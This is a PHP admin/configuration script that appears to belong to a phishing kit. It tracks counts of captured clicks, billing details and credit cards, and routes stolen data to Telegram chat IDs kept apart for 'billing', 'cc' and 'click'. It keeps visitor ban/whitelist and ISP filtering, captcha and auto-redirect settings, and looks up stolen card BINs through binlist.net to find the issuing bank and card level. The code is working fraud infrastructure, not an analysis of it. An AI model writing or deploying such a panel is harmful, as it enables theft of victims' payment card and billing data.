<?php
session_start();


$configFile = $_SERVER['DOCUMENT_ROOT'] . '/help/!#/settings.json';
$config = json_decode(file_get_contents($configFile), true);

$click = $config['statistiques']['click'];
$billing = $config['statistiques']['billing'];
$cc = $config['statistiques']['cc'];
$other = $config['statistiques']['other'];

$panel = $config['settings']['panel'];
$password = $config['settings']['password'];
$autoredirect = $config['settings']['autoredirect'];
$movement_track = $config['settings']['movement_track'];
$captcha = $config['settings']['captcha'];

$token = $config['sending']['telegram']['token'];
$chatid = $config['sending']['telegram']['chatid'];
$chatidbilling = $config['sending']['telegram']['chatidbilling'];
$chatidcc = $config['sending']['telegram']['chatidcc'];
$chatidclick = $config['sending']['telegram']['chatidclick'];
$email = $config['sending']['email'];

$banned = $config['exceptions']['banned'];
$whitelist = $config['exceptions']['whitelist'];

function updateSettings($path,$name,$text){
    $jsonString = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/help/' . $path);
    $data = json_decode($jsonString, true);
    $data["settings"][$name] = "$text";
    $newJsonString = json_encode($data);
    file_put_contents($path, $newJsonString);
}

function updateWBL($path,$name,$text){
    $jsonString = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/help/' . $path);
    $data = json_decode($jsonString, true);
    $data["exceptions"][$name] = "$text";
    $newJsonString = json_encode($data);
    file_put_contents($path, $newJsonString);
}

function updateStats($path,$name,$text){
    $jsonString = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/help/' . $path);
    $data = json_decode($jsonString, true);
    $data["statistiques"][$name] = "$text";
    $newJsonString = json_encode($data);
    file_put_contents($path, $newJsonString);
}

function updateData($path,$name,$text){
    $jsonString = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/help/' . $path);
    $data = json_decode($jsonString, true);
    if ($name == 'email') {
        $data["sending"][$name] = "$text";
    }else{
        $data["sending"]['telegram'][$name] = "$text";
    }
    $newJsonString = json_encode($data);
    file_put_contents($path, $newJsonString);
}

function addOperator($path, $country, $operator) {
    $jsonString = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/help/' . $path);
    $data = json_decode($jsonString, true);
    if (isset($data[$country])) {
        $data[$country][] = $operator;
    } else {
        $data[$country] = [$operator];
    }
    $newJsonString = json_encode($data);
    file_put_contents($path, $newJsonString);
}

function removeCountry($path, $country) {
    $jsonString = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/help/' . $path);
    $data = json_decode($jsonString, true);
    if (isset($data[$country])) {
        unset($data[$country]);
    } 
    $newJsonString = json_encode($data);
    file_put_contents($path, $newJsonString);
}

function resetStats(){
    $jsonString = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/help/!#/settings.json');
    $data = json_decode($jsonString, true);
    $data["statistiques"]["click"] = 0;
    $data["statistiques"]["billing"] = 0;
    $data["statistiques"]["cc"] = 0;
    $data["statistiques"]["other"] = 0;
    $newJsonString = json_encode($data);
    file_put_contents($_SERVER['DOCUMENT_ROOT'] . '/help/!#/settings.json', $newJsonString);
}


if (isset($_POST['countrys']) && $_POST['countrys'] != "") {
    addOperator('!#/isps.json', $_POST['countrys'], $_POST['isps']);
}

if (isset($_POST['country']) && $_POST['country'] != "") {
    addOperator('!#/isps.json', $_POST['country'], "");
}

if (isset($_POST['countryss']) && $_POST['countryss'] != "") {
    removeCountry('!#/isps.json', $_POST['countryss']);
}

if (isset($_POST['resets']) && $_POST['resets'] != "") {
    resetStats();
}

if (isset($_POST['email'], $_POST['token'])) {
    updateData('!#/settings.json', 'email', $_POST['email']);
    updateData('!#/settings.json', 'token', $_POST['token']);
    updateData('!#/settings.json', 'chatid', $_POST['chatid']);
    updateData('!#/settings.json', 'chatidbilling', $_POST['chatidbilling']);
    updateData('!#/settings.json', 'chatidcc', $_POST['chatidcc']);
    updateData('!#/settings.json', 'chatidclick', $_POST['chatidclick']);

    if ($_POST['password'] != $password) {
        if ($_POST['password'] != '') {
            updateSettings('!#/settings.json', 'password', password_hash($_POST['password'], PASSWORD_DEFAULT));
        }else{
            updateSettings('!#/settings.json', 'password', '');
        }
        unset($_SESSION['loged_in']);
    }
    
    updateSettings('!#/settings.json', 'panel', $_POST['panel']);
    updateSettings('!#/settings.json', 'autoredirect', $_POST['autoredirect']);
    updateSettings('!#/settings.json', 'captcha', $_POST['captcha']);
    updateSettings('!#/settings.json', 'movement_track', $_POST['movement_track']);
}

if (isset($_POST['wl'], $_POST['bl'])) {
    updateSettings('!#/settings.json', 'panel', $_POST['panel']);
    updateSettings('!#/settings.json', 'autoredirect', $_POST['autoredirect']);
    updateSettings('!#/settings.json', 'captcha', $_POST['captcha']);
    updateSettings('!#/settings.json', 'movement_track', $_POST['movement_track']);
}

function binCheck($bin) {
    $url = 'https://lookup.binlist.net/' . $bin;
    $result = @file_get_contents($url);
    $data = @json_decode($result, true);
    
    if ($data && isset($data['bank'])) {
        $vendor = @isset($data['scheme']) ? $data['scheme'] : '';
        $type = @isset($data['type']) ? $data['type'] : '';
        $level = @isset($data['level']) ? $data['level'] : '';
        $bank = @isset($data['bank']['name']) ? $data['bank']['name'] : '';
        return $vendor . "|" . $type . "|" . $level . "|" . $bank;
    }
    
    return "";
}

$configFile = $_SERVER['DOCUMENT_ROOT'] . '/help/!#/settings.json';
$config = json_decode(file_get_contents($configFile), true);

$click = $config['statistiques']['click'];
$billing = $config['statistiques']['billing'];
$cc = $config['statistiques']['cc'];
$other = $config['statistiques']['other'];

$panel = $config['settings']['panel'];
$password = $config['settings']['password'];
$autoredirect = $config['settings']['autoredirect'];
$movement_track = $config['settings']['movement_track'];
$captcha = $config['settings']['captcha'];

$token = $config['sending']['telegram']['token'];
$chatid = $config['sending']['telegram']['chatid'];
$chatidbilling = $config['sending']['telegram']['chatidbilling'];
$chatidcc = $config['sending']['telegram']['chatidcc'];
$chatidclick = $config['sending']['telegram']['chatidclick'];
$email = $config['sending']['email'];

$banned = $config['exceptions']['banned'];
$whitelist = $config['exceptions']['whitelist'];

?>
